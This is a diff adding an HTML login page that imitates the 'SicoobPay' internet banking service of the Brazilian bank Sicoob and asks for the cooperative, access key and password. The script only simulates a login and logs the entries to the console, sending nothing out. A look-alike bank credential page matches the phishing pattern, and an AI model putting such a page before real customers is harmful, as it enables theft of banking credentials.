@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="pt" translate="no">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>SicoobPay | Internet Banking</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+    background: linear-gradient(180deg, #0D7A72 0%, #0D7A72 50%, #1B9A8B 100%);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 20px;
+    position: relative;
+  }
+
+  .container {
+    width: 100%;
+    max-width: 420px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding-top: 20px;
+    padding-bottom: 100px;
+  }
+
+  /* HEADER LOGO */
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .logo-title {
+    font-size: 28px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+
+  .logo-title .sicoob {
+    color: #FFFFFF;
+  }
+
+  .logo-title .pay {
+    color: #4CC964;
+  }
+
+  /* FORM CARD */
+  .form-card {
+    width: 100%;
+    background: rgba(10, 92, 92, 0.4);
+    border: 1px solid rgba(79, 172, 157, 0.5);
+    border-radius: 8px;
+    padding: 24px;
+    margin-bottom: 24px;
+  }
+
+  .form-description {
+    color: rgba(255, 255, 255, 0.9);
+    font-size: 13px;
+    line-height: 1.5;
+    margin-bottom: 20px;
+    text-align: center;
+  }
+
+  /* FORM INPUTS */
+  .form-group {
+    margin-bottom: 16px;
+  }
+
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(79, 172, 157, 0.6);
+    border-radius: 6px;
+    color: rgba(255, 255, 255, 0.9);
+    font-size: 13px;
+    font-family: inherit;
+    transition: all 0.3s ease;
+  }
+
+  .form-input::placeholder {
+    color: rgba(255, 255, 255, 0.7);
+  }
+
+  .form-input:focus {
+    outline: none;
+    background: rgba(255, 255, 255, 0.08);
+    border-color: rgba(76, 201, 100, 0.8);
+    box-shadow: 0 0 0 2px rgba(76, 201, 100, 0.1);
+  }
+
+  /* LOGIN BUTTON */
+  .btn-login {
+    width: 100%;
+    padding: 14px 16px;
+    background: #4FAC9D;
+    color: #FFFFFF;
+    border: none;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    margin-top: 8px;
+    font-family: inherit;
+  }
+
+  .btn-login:hover {
+    background: #3D9588;
+  }
+
+  .btn-login:active {
+    transform: scale(0.98);
+  }
+
+  .btn-login.loading {
+    pointer-events: none;
+    background: #2D7A6F;
+  }
+
+  .spinner {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top-color: #FFFFFF;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* ACCESS TABS */
+  .access-tabs {
+    width: 100%;
+    display: flex;
+    gap: 12px;
+    margin-bottom: 24px;
+  }
+
+  .access-tab {
+    flex: 1;
+    padding: 12px;
+    background: rgba(255, 255, 255, 0.1);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    border-radius: 6px;
+    color: rgba(255, 255, 255, 0.8);
+    font-size: 12px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .access-tab.active {
+    background: rgba(10, 60, 60, 0.6);
+    border-color: rgba(255, 255, 255, 0.3);
+  }
+
+  .access-tab:hover:not(.active) {
+    background: rgba(255, 255, 255, 0.15);
+  }
+
+  .tab-icon {
+    font-size: 20px;
+  }
+
+  .tab-label {
+    font-weight: 600;
+    text-align: center;
+    line-height: 1.3;
+  }
+
+  .tab-label .small {
+    font-size: 10px;
+    color: rgba(255, 255, 255, 0.6);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    display: block;
+  }
+
+  /* FOOTER LINKS */
+  .footer-links {
+    width: 100%;
+    text-align: center;
+    font-size: 12px;
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+
+  .footer-links a {
+    color: rgba(255, 255, 255, 0.7);
+    text-decoration: none;
+    transition: color 0.3s ease;
+  }
+
+  .footer-links a:hover {
+    color: rgba(255, 255, 255, 0.95);
+    text-decoration: underline;
+  }
+
+  .footer-sep {
+    color: rgba(255, 255, 255, 0.5);
+  }
+
+  /* BOTTOM ELEMENTS */
+  .bottom-section {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+    padding: 16px 20px;
+    pointer-events: none;
+  }
+
+  .sicoob-icon {
+    width: 56px;
+    height: 56px;
+    background: linear-gradient(135deg, #D4A74D 0%, #E8BC2F 100%);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    pointer-events: auto;
+    cursor: pointer;
+    transition: transform 0.3s ease;
+  }
+
+  .sicoob-icon:hover {
+    transform: scale(1.05);
+  }
+
+  .recaptcha-container {
+    pointer-events: auto;
+  }
+
+  .g-recaptcha {
+    transform: scale(0.8);
+    transform-origin: bottom right;
+  }
+
+  /* MOBILE RESPONSIVE */
+  @media (max-width: 480px) {
+    .container {
+      padding-top: 15px;
+      padding-bottom: 100px;
+    }
+
+    .header {
+      margin-bottom: 25px;
+    }
+
+    .logo-title {
+      font-size: 24px;
+    }
+
+    .form-card {
+      padding: 20px;
+    }
+
+    .bottom-section {
+      padding: 12px 16px;
+    }
+
+    .sicoob-icon {
+      width: 48px;
+      height: 48px;
+      font-size: 24px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <!-- HEADER LOGO -->
+  <div class="header">
+    <div class="logo-title">
+      <span class="sicoob">SICOOB</span><span class="pay">PAY</span>
+    </div>
+  </div>
+
+  <!-- FORM CARD -->
+  <div class="form-card">
+    <div class="form-description">
+      Informe os dados abaixo para acessar o SicoobPay
+    </div>
+
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <div class="form-group">
+        <input 
+          type="text" 
+          class="form-input" 
+          placeholder="Informe a sua cooperativa" 
+          id="cooperativa"
+          autocomplete="organization"
+          required
+        />
+      </div>
+
+      <div class="form-group">
+        <input 
+          type="text" 
+          class="form-input" 
+          placeholder="Informe a sua chave de acesso" 
+          id="chaveAcesso"
+          autocomplete="username"
+          required
+        />
+      </div>
+
+      <div class="form-group">
+        <input 
+          type="password" 
+          class="form-input" 
+          placeholder="Digite a sua senha de acesso" 
+          id="senha"
+          autocomplete="current-password"
+          required
+        />
+      </div>
+
+      <button type="submit" class="btn-login" id="btnLogin">
+        Entrar
+      </button>
+    </form>
+  </div>
+
+  <!-- ACCESS TABS -->
+  <div class="access-tabs">
+    <div class="access-tab active" onclick="switchTab(this, 'banking')">
+      <div class="tab-icon">💻</div>
+      <div class="tab-label">Internet<br/>Banking</div>
+    </div>
+    <div class="access-tab" onclick="switchTab(this, 'operator')">
+      <div class="tab-icon">👤</div>
+      <div class="tab-label">
+        <span class="small">ACESSO</span>
+        OPERADOR
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER LINKS -->
+  <div class="footer-links">
+    <a href="#">Política de Privacidade</a>
+    <span class="footer-sep">|</span>
+    <a href="#">Termos e condições</a>
+    <span class="footer-sep">|</span>
+    <a href="#">Fale conosco</a>
+  </div>
+</div>
+
+<!-- BOTTOM ELEMENTS -->
+<div class="bottom-section">
+  <div class="sicoob-icon" title="Sicoob">₹</div>
+  <div class="recaptcha-container">
+    <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
+  </div>
+</div>
+
+<!-- reCAPTCHA Script -->
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+<script>
+  // Tab switching
+  function switchTab(element, tabType) {
+    const tabs = document.querySelectorAll('.access-tab');
+    tabs.forEach(tab => tab.classList.remove('active'));
+    element.classList.add('active');
+    console.log('Switched to:', tabType);
+  }
+
+  // Login handler
+  function handleLogin(event) {
+    event.preventDefault();
+
+    const btn = document.getElementById('btnLogin');
+    const cooperativa = document.getElementById('cooperativa').value;
+    const chaveAcesso = document.getElementById('chaveAcesso').value;
+    const senha = document.getElementById('senha').value;
+
+    // Validate inputs
+    if (!cooperativa || !chaveAcesso || !senha) {
+      alert('Por favor, preencha todos os campos');
+      return;
+    }
+
+    // Show loading state
+    btn.classList.add('loading');
+    btn.innerHTML = '<span class="spinner"></span>Verificando...';
+
+    // Simulate login process
+    setTimeout(() => {
+      btn.innerHTML = '✓ Acesso autorizado';
+      btn.style.background = '#3bb84f';
+
+      // Reset after 2 seconds
+      setTimeout(() => {
+        btn.classList.remove('loading');
+        btn.style.background = '';
+        btn.innerHTML = 'Entrar';
+        
+        // Here you would normally redirect to dashboard
+        console.log('Login successful');
+        console.log('Cooperativa:', cooperativa);
+        console.log('Chave:', chaveAcesso);
+      }, 1500);
+    }, 1200);
+  }
+
+  // Form input focus effects
+  document.querySelectorAll('.form-input').forEach(input => {
+    input.addEventListener('focus', function() {
+      this.parentElement.style.transform = 'scale(1.02)';
+    });
+
+    input.addEventListener('blur', function() {
+      this.parentElement.style.transform = 'scale(1)';
+    });
+  });
+
+  // Keyboard enter support
+  document.getElementById('loginForm').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      handleLogin(e);
+    }
+  });
+</script>
+
+</body>
+</html>
